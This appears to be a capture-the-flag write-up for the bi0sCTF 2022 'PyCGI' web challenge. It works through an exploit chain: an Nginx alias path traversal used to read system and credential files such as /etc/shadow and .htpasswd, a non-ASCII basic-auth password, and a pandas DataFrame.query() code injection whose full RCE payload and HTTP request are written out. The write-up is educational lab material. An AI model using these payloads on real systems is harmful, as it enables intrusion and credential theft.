---
title: Writeup - PyCGI (bi0sCTF 2022)
date: 2023-01-22 00:00:00
tags: 
- writeup
- web
- bi0sctf2022
---

# bi0sCTF 2022 - PyCGI Writeup
- Type - Web
- Name - PyCGI
- Points - 887

## Description
```markdown
Hope its working. Can you check?

http://instance.chall.bi0s.in:10000/challenge/2

Note: No bruteforcing is required to solve this challenge.

Challenge File: Primary Link

Challenge Author : yadhu
```

Find files [here](/static/bi0sctf-pycgi/pycgi.zip)

## Writeup
Initially, you are only provided two files - a [Dockerfile](/static/bi0sctf-pycgi/Dockerfile), and [Nginx config file](/static/bi0sctf-pycgi/nginx.conf). The Dockerfile is below:

```dockerfile
FROM ubuntu
RUN apt-get -y update && DEBIAN_FRONTEND="noninteractive" TZ="Asia/Kolkata" \
apt-get -y -q install nginx apache2-utils spawn-fcgi fcgiwrap python3 python3-pip
EXPOSE 80/tcp

RUN ["pip3", "install", "pandas"]
COPY docker-entrypoint.sh /
RUN ["chmod", "+x", "/docker-entrypoint.sh"]
COPY flag.txt /
COPY static /static/
COPY config/nginx.conf /etc/nginx/
COPY src/ /panda

ENTRYPOINT ["/docker-entrypoint.sh"]   
```

The important part of the Nginx config file is below:

```
server {
    listen       8000;
    server_name  localhost;

    location / {
            autoindex on;
            root /panda/;
    }

    location /cgi-bin/ {
            gzip off;
            
            auth_basic           "Admin Area";
            auth_basic_user_file /etc/.htpasswd;

            include fastcgi_params;
            fastcgi_pass unix:/var/run/fcgiwrap.socket;
            fastcgi_param SCRIPT_FILENAME /panda/$fastcgi_script_name;
    }

    location /static {
            alias /static/; 
    }
}
```

Spinning up an instance of the website gives you a simple directory listing. 

<img src="/static/bi0sctf-pycgi/site.png" width="500px">

Going to the `/templates/` folder shows a simple HTML page with a form that sends a GET request to `search_currency.py` with the text parameter `currency_name`, and a link to `/static/style.css`. Going to `/database/` shows a single file - `currency-rates.csv` with nothing interesting inside. Finally, clicking on `/cgi-bin/` brings up a basic authentication form. This is all the info given at the start of the challenge. 

As far as I knew, the goal was to get arbitrary file read to read `/flag.txt`, which was located there from the Dockerfile given to us. After doing initial recon and getting all the above information, I started to put together what was going on. The `/static/` directory contained static HTML/CSS/JS files, and `/panda/` contained three directories - `cgi-bin/`, `database/`, and `templates/`. We already know what's in `database/` and `templates/`, but since `templates/index.html` refers to `search_currency.py`, one could guess that `cgi-bin/search_currency.py` existed, but was not accessible due to the basic authentication required in the Nginx config file. 

### Nginx Misconfiguration
The first vulnerability that I identified was found pretty quickly due to an Nginx misconfiguration. [This article by Acunetix](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/) clearly lays out how location directives in Nginx config files that don't end in a `/` but their alias does allows limited arbitrary read. Three lines of our config file matched this exactly:

```
location /static {
        alias /static/; 
}
```

This directive turned any path starting with `/static/abc` into `/static//abc`, meaning it would also turn `/static../etc/passwd` into `/static/../etc/passwd`, giving us **full** arbitrary read. This vulnerability only allows you to traverse up one directory, but since `/static` was in the root directory, it gave us full read access. My first thought was to try `/static../flag.txt` even though it seemed too simple, and I was correct - I got a 404 response. Confused at why it didn't work, I thought it was something with permissions even though the Nginx config told us it was running as root.

I did find that `/static../etc/passwd` and `/static../etc/shadow` worked, however. I then retrieved the `/etc/.htpasswd` file that would have the Nginx basic auth credentials stored. 

```
$ curl http://instance.chall.bi0s.in:10051/static../etc/.htpasswd
admin:$apr1$YrHucIO/$U0yJlh015kBDbjHD/bN2O.
```

I threw this into John the Ripper, but no easy wins - it just kept running. In the meantime, I kept looking around and reviewing the files I knew were there. I extracted `/panda/database/currency-rates.csv`, `/panda/templates/index.html`, and `/panda/cgi-bin/search_currency.py` (found [here](/static/bi0sctf-pycgi/search_currency.py)). At this point, I looked back at `/etc/.htpasswd` since I couldn't run `search_currency.py` until I cracked credentials. I then started thinking - where did `/etc/.htpasswd` come from anyway? It's not present in the default Ubuntu docker container (I checked), and it wasn't generated in the Dockerfile. What if it was created in `/docker-entrypoint.sh` that was run at container creation??

### Plaintext Password
Retrieving the `/docker-entrypoint.sh` file was easy, and gave the information I was looking for. 

```
$ curl http://instance.chall.bi0s.in:10051/static../docker-entrypoint.sh
#!/bin/sh
export PYTHONDONTWRITEBYTECODE=1

mv flag.txt $(head /dev/urandom | shasum | cut -d' ' -f1)

htpasswd -mbc /etc/.htpasswd admin -

spawn-fcgi -s /var/run/fcgiwrap.socket -M 766 /usr/sbin/fcgiwrap

/usr/sbin/nginx

while true; do sleep 1; done
```

First, I understood that requesting `/flag.txt` didn't work because it was moved to a random name; this meant we'd have to get RCE to pwn the challenge by listing the directory. Secondly, the command `htpasswd -mbc /etc/.htpasswd admin -` was being used to generate the admin password. After looking up this command, I found that the `-b` flag meant the password was read in from the command line. So was the password just `-`?? Both trying `admin:-` in the browser and in John the Ripper confirmed that that was NOT the case. 

At this point, I looked at `search_currency.py` more, but for this writeup's continuity sake, I'm going to cover that section next. At one point, I came back to this because it just didn't make sense to me that it didn't work. I decided to retrace the steps of this Bash script in an Ubuntu container myself, and when copying and pasting this exact line into the Docker terminal, I discovered it - it was pasted as `\302\255`. Was this a non-ASCII character??? Using `xxd` on the file confirmed that, **YES**, the character `\xad` was the password, and my terminal had displayed this as a `-` character. 

To confirm this, I opened up Window's Character Map, copied the character 0xAD, and went to `http://instance.chall.bi0s.in:10051/cgi-bin/`. I used `admin:\xad` as my credentials, and it worked!! Gosh dang it that was tricky of them! Now that I had access to the Python scripts, I needed to find a vulnerability that would get me RCE.

### Vulnerable Python Script
The third vulnerability in this exploit chain was Python code injection that gave me RCE. This is what the `search_currency.py` script contained:

```python
#!/usr/bin/python3

from server import Server
import pandas as pd

try:
    df = pd.read_csv("../database/currency-rates.csv")
    server = Server()
    server.set_header("Content-Type", "text/html")
    params = server.get_params()
    assert "currency_name" in params
    currency_code = params["currency_name"]
    results = df.query(f"currency == '{currency_code}'")
    server.add_body(results.to_html())
    server.send_response()
except Exception as e:
    print("Content-Type: text/html")
    print()
    print("Exception")
    print(str(e))
```

Immediately, line 13 stood out to me as some sort of SQL-like injection, but it was put in Python Panda's DataFrame `query()` function. I started testing various payloads in both Burp Suite and locally to see how I could get RCE from this injection. I also started scouring the Internet, looking for documentation, Stack Overflow answers, or previous security research/CTF writeups for how to run code. Simple payloads like `currency_name=' or '1'=='1` gave `unterminated string literal` exceptions, or `currency_name=' or chr(88)#'` gave the `"chr" is not a supported function"` exception. After playing in this weird Python sandbox-like environment, I figured out what was going on and what I needed to do. 

For your sanity and mine, I won't go through my thought process, but rather the final discoveries of my journey. First, FastCGI (the protocol used to communicate between Nginx and our Python script) doesn't URL decode, meaning my URL-encoded payloads that are normally required in an HTTP request were not being processed and rather just broke it; in fact, it didn't care about spaces in the URL query string at all, and processed them just right. Secondly, I could use a `#` comment sign at the end to ignore the trailing single quote (`'`) in the query. Thirdly, based off of how the server was processing the arguments, inserting `=`, `&`, or `?` anywhere in my payload would mess it up. Lastly, my query had to be syntactically correct before being fully processed. 

After more investigation, the [Pandas DataFrame `query()` documentation](https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.query.html) quickly mentioned that variables in the local environment could be referenced by prefixing it with an `@` symbol. Armed with this knowledge and HackTricks' [Bypass Python sandboxes page](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes), I eventually found a way to run code - `OBEL' or (@__builtins__.__import__("os").system("sleep 5")).__eq__(1)#`. Note that this was blind RCE, but since the request took 5 seconds to return, I knew it was being run.

### Solve
My final HTTP request was (ignore the long line pls):

```
GET /cgi-bin/search_currency.py?currency_name=OBEL' or (@__builtins__.__import__("os").system("ls / > /tmp/test")).__eq__(1)# HTTP/1.1
Host: instance.chall.bi0s.in:10735
Authorization: Basic YWRtaW46wq0=
Connection: close

```

To retrieve the flag, I ran the commands below.

```
$ curl http://instance.chall.bi0s.in:10064/static../tmp/test
9753555db7ed1df995555128ae32cf442f767382
bin
boot
dev
docker-entrypoint.sh
...
$ curl http://instance.chall.bi0s.in:10064/static../9753555db7ed1df9...32cf442f767382
bi0sctf{9a18559a42e7302b15eeb45c09ab39d6}
```


**Flag:** `bi0sctf{9a18559a42e7302b15eeb45c09ab39d6}`

## Final Thoughts
As I've spent more time in CTFs and done more difficult challenges, I've realized the importance of exploit chains. A good amount of high-severity vulnerabilities are just conglomerations of low-severity vulnerabilities linked together in a chain that allows greater access than each vulnerability individually. This was definitely a fun exploit chain to discover with some sly roadblocks thrown up (like a non-ASCII password!), but comes to show the importance of not giving up and always being thorough in your recon. Although we weren't given much information at first, continuously looking for more and trying to make sense of each line of code and config is what allowed me to understand what was happening and what I needed to do. 

Looking forward to more fun challs from bi0sCTF! 